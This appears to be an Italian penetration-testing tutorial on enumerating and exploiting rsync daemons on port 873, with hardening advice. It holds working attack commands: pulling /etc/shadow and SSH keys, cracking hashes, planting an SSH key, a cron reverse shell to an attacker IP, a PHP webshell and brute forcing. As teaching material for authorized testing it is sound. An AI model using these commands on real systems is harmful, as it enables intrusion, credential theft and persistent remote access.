---
title: 'Rsync Port 873: Enumeration, Anonymous Access e Exploitation'
slug: rsync
description: 'Pentest Rsync sulla porta 873: enumera rsyncd e moduli, verifica accesso anonimo e write access, analizza file esposti e possibili attack path.'
image: /rsync.webp
draft: false
date: 2026-01-25T00:00:00.000Z
lastmod: 2026-09-18T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - rsync
  - Rsyncd
  - File Disclosure
  - Moduli Rsync
featured: true
---

# Rsync Porta 873: Enumerazione, File Disclosure e Exploitation

Trovi la porta 873 aperta durante una scansione. A seconda di come sono configurati i moduli esposti, puoi arrivare a leggere file sensibili, scrivere dati sul target e — solo se il path scritto lo permette — ottenere accesso al sistema. Questa guida segue la catena reale: enumerazione del demone → moduli → accesso anonimo o autenticato → read/write → condizioni per trasformare la scrittura in accesso.

## Cos'è rsyncd e Perché la Porta 873 è Interessante

`rsync` è il programma client di sincronizzazione file; `rsyncd` è il demone che espone **moduli** — directory condivise definite in `/etc/rsyncd.conf` — tramite il protocollo rsync, tipicamente su TCP 873. Ogni modulo può richiedere autenticazione oppure no, ed essere in sola lettura o scrivibile: sono due impostazioni indipendenti, non un'unica opzione.

```ini
[backup]
    path = /var/backup
    read only = yes
    # nessun auth users → accesso senza credenziali

[storage]
    path = /home/fox
    read only = no
    # scrivibile + nessuna auth → superficie ampia, ma l'impatto dipende dal path
```

Un modulo privo di `auth users` può risultare accessibile senza credenziali — non è una garanzia assoluta in ogni build/configurazione, ma è la misconfig di gran lunga più comune. Verifica sempre il comportamento effettivo del demone, non darlo per scontato dalla sola config di esempio.

## Enumerare i Moduli Esposti

```bash
nmap -sV -sC -p 873 <target>
```

```text
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules:
|   backup    Daily system backup
|   www       Web document root
```

Lista moduli senza credenziali:

```bash
rsync rsync://<target>/
```

Se risponde con l'elenco invece di chiedere una password, l'accesso anonimo alla lista moduli è confermato — non ancora l'accesso al contenuto di ciascuno, quello va verificato modulo per modulo.

Contenuto di un modulo specifico:

```bash
rsync -av --list-only rsync://<target>/backup/
```

Filtra subito per file interessanti:

```bash
rsync -av --list-only rsync://<target>/backup/ | grep -iE "shadow|id_rsa|\.conf|\.key|secret"
```

## File Disclosure

```bash
rsync -av rsync://<target>/backup/etc/shadow /tmp/shadow
rsync -av rsync://<target>/backup/root/.ssh/id_rsa /tmp/root_key
```

Modulo intero:

```bash
rsync -av rsync://<target>/backup/ /tmp/dump/
```

**`shadow`** contiene password hash — non "hash delle password" genericamente, il formato va identificato prima di craccare. `1800` in [hashcat](https://hackita.it/articoli/hashcat/) è specifico per SHA-512 crypt: se il modulo target usa un algoritmo diverso, quel mode non funziona.

```bash
hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt
```

**`id_rsa`** — se la chiave non è protetta da passphrase, è direttamente utilizzabile:

```bash
chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@<target>
```

**`rsyncd.secrets`** — se leggibile, contiene le credenziali per i moduli protetti.

## Moduli Writable: Cosa Significa Davvero

`read only = no` indica che il client può scrivere nel modulo — non implica automaticamente RCE o accesso al sistema. L'impatto reale dipende interamente da dove scrivi:

| Destinazione mappata                | Impatto possibile                                                                         |
| ----------------------------------- | ----------------------------------------------------------------------------------------- |
| Directory di backup generica        | Overwrite/disclosure di file, poco altro                                                  |
| Home directory di un utente         | Possibile path verso accesso SSH, se le condizioni sotto sono vere                        |
| Web root servita da un web server   | Possibile modifica di contenuti applicativi, se il server esegue il tipo di file caricato |
| Directory cron (`/etc/cron.d`)      | Possibile esecuzione, se cron è attivo e il file rispetta il formato atteso               |
| Directory arbitraria senza uso noto | Dipende interamente dai permessi effettivi sul filesystem                                 |

**Verifica reale della scrittura** — un `--dry-run` riuscito non dimostra che la scrittura sia realmente possibile: simula solo come rsync pianificherebbe l'operazione, non la esegue.

```bash
rsync -av --dry-run /tmp/test.txt rsync://<target>/storage/
```

Per una verifica reale, scrivi un file di test innocuo e conferma che compaia effettivamente nel listing:

```bash
rsync -av /tmp/test.txt rsync://<target>/storage/
rsync -av --list-only rsync://<target>/storage/ | grep test.txt
```

## Attack Path: da Modulo Writable a SSH

```bash
ssh-keygen -f /tmp/backdoor -N ""
mkdir /tmp/.ssh
rsync -av /tmp/.ssh/ rsync://<target>/storage/.ssh/
rsync -av /tmp/backdoor.pub rsync://<target>/storage/.ssh/authorized_keys
ssh -i /tmp/backdoor fox@<target>
```

Funziona solo se **tutte** queste condizioni sono vere: il path del modulo corrisponde davvero alla home dell'utente target, la scrittura arriva con ownership e permessi compatibili con quello che `sshd` accetta per `authorized_keys` (spesso richiede che il file non sia scrivibile da altri e appartenga all'utente giusto), e il servizio SSH è raggiungibile con quell'account. Se anche una di queste manca, la chiave viene scritta ma non usata.

Nota sull'ordine: se la versione remota di rsync è vecchia, `--mkpath` può non funzionare — carica prima la cartella vuota, poi il file, nell'ordine mostrato sopra.

## Attack Path: da Modulo Writable a Reverse Shell via Cron

```bash
echo "* * * * * root bash -i >& /dev/tcp/<tuo_ip>/9001 0>&1" > /tmp/evil_cron
rsync -av /tmp/evil_cron rsync://<target>/backup/etc/cron.d/persistence
```

Listener: `nc -lvnp 9001`

Condizioni necessarie: il modulo deve mappare realmente `/etc/cron.d` (o una directory equivalente letta da cron), la scrittura deve avere permessi che cron accetta di eseguire, e il demone cron deve essere attivo e raggiungere effettivamente quella directory. Senza queste, il file resta scritto e inerte.

## Attack Path: da Modulo Writable a Webshell

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/cmd.php
rsync -av /tmp/cmd.php rsync://<target>/www/cmd.php
curl "http://<target>/cmd.php?c=id"
```

Funziona solo se il path del modulo coincide davvero con una web root servita da un web server attivo e quel server interpreta PHP — caricare il file da solo non produce nulla se manca una di queste due condizioni.

## Moduli Autenticati

Se un modulo richiede password, verifica prima se hai già credenziali raccolte in altre fasi dell'assessment (riuso password, `rsyncd.secrets` trovato altrove) prima di passare al brute force:

```bash
nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
```

`@ERROR: auth failed` non significa automaticamente "serve brute force": puoi aver sbagliato username, nome modulo, o la password è semplicemente diversa da quelle testate finora — conferma prima gli altri fattori.

## Troubleshooting

| Errore                   | Causa probabile                                                  | Verifica                                                            |
| ------------------------ | ---------------------------------------------------------------- | ------------------------------------------------------------------- |
| Connection refused       | rsyncd non in ascolto sulla porta standard                       | `nmap -p- <target>` per porte custom                                |
| `@ERROR: auth failed`    | Credenziali richieste e non valide (o username/modulo sbagliato) | Riconferma nome modulo e formato credenziali prima di brute-forzare |
| `@ERROR: Unknown module` | Nome modulo errato                                               | `rsync rsync://<target>/` per la lista corretta                     |
| `read only`              | Il modulo non è scrivibile                                       | Prova altri moduli, non forzare quello                              |
| `change_dir failed`      | La directory di destinazione non esiste sul target               | Carica prima la cartella, poi il file                               |

## Post-Exploitation

Una volta ottenuta una shell, l'enumerazione locale segue lo stesso schema di qualsiasi altro foothold Linux — vedi [LinPEAS](https://hackita.it/articoli/linpeas/) per l'enumerazione automatica dei vettori di privilege escalation. Non è specifico di rsync, quindi non lo duplico qui.

## Hardening

* `auth users` + `secrets file` su ogni modulo esposto.
* `read only = yes` come default, scrivibile solo dove serve davvero.
* `hosts allow` per limitare gli IP autorizzati a raggiungere il demone.
* Logging in `/var/log/rsyncd.log` con monitoraggio attivo su listing e trasferimenti anomali.
* Dove possibile, sostituisci rsyncd con rsync over SSH (`rsync -e ssh`), che elimina il protocollo non autenticato sulla 873.

## Attack Chain Completa

| Fase                       | Comando                                                                   |
| -------------------------- | ------------------------------------------------------------------------- |
| Discovery                  | `nmap -sV -sC -p 873 <target>`                                            |
| Enumerazione moduli        | `rsync rsync://<target>/`                                                 |
| Contenuto modulo           | `rsync -av --list-only rsync://<target>/<mod>/`                           |
| File disclosure            | `rsync -av rsync://<target>/<mod>/path/file /tmp/`                        |
| Verifica scrittura reale   | `rsync -av test.txt rsync://<target>/<mod>/` + `--list-only` per conferma |
| Attack path (SSH/cron/web) | Solo se le condizioni della sezione corrispondente sono verificate        |

## FAQ

**Qual è la differenza tra rsync e rsyncd?**
`rsync` è l'utility client di sincronizzazione, `rsyncd` è il demone server che espone moduli via rete, tipicamente su TCP 873.

**Un modulo rsync writable significa RCE garantito?**
No. Significa solo che puoi scrivere nel path mappato dal modulo — l'impatto dipende interamente da cosa consuma quel path (cron, web server, home SSH) e dalle condizioni descritte nelle sezioni sopra.

**`--dry-run` riuscito prova che posso scrivere davvero?**
No, simula solo il piano dell'operazione. Per una prova reale devi scrivere un file di test e confermarne la presenza con `--list-only`.

**Rsyncd può portare a una shell?**
Sì, ma non direttamente: serve un path scrivibile che finisca in un posto sfruttabile (home SSH, cron, web root) con permessi coerenti — nessuno di questi è garantito dal solo fatto che il modulo sia writable.

***

Uso esclusivo in ambienti autorizzati.
